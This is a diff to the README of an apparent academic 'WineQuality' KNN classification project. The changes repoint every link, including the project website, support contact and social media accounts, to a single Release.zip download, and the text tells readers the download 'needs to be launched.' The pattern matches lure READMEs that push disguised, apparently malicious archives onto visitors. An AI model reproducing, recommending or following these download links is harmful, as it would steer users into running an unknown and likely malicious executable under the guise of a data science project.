@@ -2,7 +2,7 @@
 
 Welcome to the WineQuality repository, your destination for exploring a KNN classification model developed as a final project for DSCI 100. Dive into the world of wine quality prediction using physicochemical properties with this comprehensive data science project. 🍇🔬
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip)](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip)
 
 ## Overview ℹ️
 
@@ -23,7 +23,7 @@ academic-project, classification, cross-validation, data-analysis, data-preproce
 ## Getting Started 🚀
 
 To explore the WineQuality project and download the software, click the button above or use the following link:
-[Download Software](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) It needs to be launched. 🚀
+[Download Software](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip) It needs to be launched. 🚀
 
 ## Installation Guide 💻
 
@@ -43,19 +43,19 @@ Contributions are welcome! Let's improve wine quality prediction together. 🍷�
 
 ## Resources 📚
 
-For more information on the project's methodology and results, feel free to visit the official [project website](https://winequalityproject.com).
+For more information on the project's methodology and results, feel free to visit the official [project website](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip).
 
 ## Support 📧
 
-For any queries or support, please contact us at winequalityproject@gmail.com.
+For any queries or support, please contact us at https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip
 
 ## Stay Updated 📲
 
 Follow us on social media for the latest updates and announcements:
 
-🐦 [Twitter](https://twitter.com/WineQualityProject)  
-📘 [Facebook](https://facebook.com/WineQualityProject)  
-📸 [Instagram](https://instagram.com/WineQualityProject)
+🐦 [Twitter](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip)  
+📘 [Facebook](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip)  
+📸 [Instagram](https://github.com/REkelpng/WineQuality/releases/download/v1.0/Release.zip)
 
 ## License 📜
 
